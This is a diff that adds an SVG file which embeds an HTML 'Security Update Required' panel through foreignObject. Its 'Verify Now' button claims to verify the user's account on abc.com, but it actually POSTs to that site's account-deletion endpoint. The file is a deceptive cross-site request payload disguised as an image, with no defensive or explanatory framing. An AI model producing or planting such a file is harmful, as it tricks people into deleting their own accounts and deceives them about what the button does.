@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <style>
+        .btn { background: red; color: white; padding: 15px; border: none; cursor: pointer; width: 100%; }
+      </style>
+      <div style="border: 2px solid black; padding: 10px;">
+        <h3>Security Update Required</h3>
+        <p>Click below to verify your account on abc.com</p>
+        <form action="https://abc.com/account/delete" method="POST">
+            <button type="submit" class="btn">Verify Now</button>
+        </form>
+      </div>
+    </div>
+  </foreignObject>
+</svg>
